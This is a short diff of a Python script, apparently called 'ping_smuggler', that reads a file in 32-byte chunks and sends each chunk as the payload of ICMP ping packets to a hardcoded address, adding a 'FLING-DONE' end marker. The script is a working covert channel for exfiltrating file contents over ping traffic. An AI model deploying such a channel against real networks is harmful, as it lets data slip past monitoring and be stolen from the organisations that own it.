@@ -12,13 +12,24 @@ def send_icmp_ping(dest_ip, text_chunks):
         send(packet)
         print(f"Sent one packet with text: '{chunk}'")
 
-if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python script.py [destination IP] [file path]")
-        sys.exit(1)
+    # After sending all text chunks, send a final packet indicating completion
+    final_packet = IP(dst=dest_ip)/ICMP()/b"FLING-DONE"
+    send(final_packet)
+    print("Sent final packet indicating completion: 'FLING-DONE'")
 
-    dest_ip = sys.argv[1]
-    file_path = sys.argv[2]
+
+if __name__ == "__main__":
+
+
+    # if len(sys.argv) != 3:
+    #     print("Usage: python script.py [destination IP] [file path]")
+    #     sys.exit(1)
+
+    # dest_ip = sys.argv[1]
+    # file_path = sys.argv[2]
+
+    dest_ip = "169.254.0.0"
+    file_path = "/Users/larsoncarter/Documents/GIT-REPOS/ping_smuggler/message.txt"
 
     text_chunks = read_file_chunks(file_path, 32)  # Adjust the chunk size if needed
     send_icmp_ping(dest_ip, text_chunks)
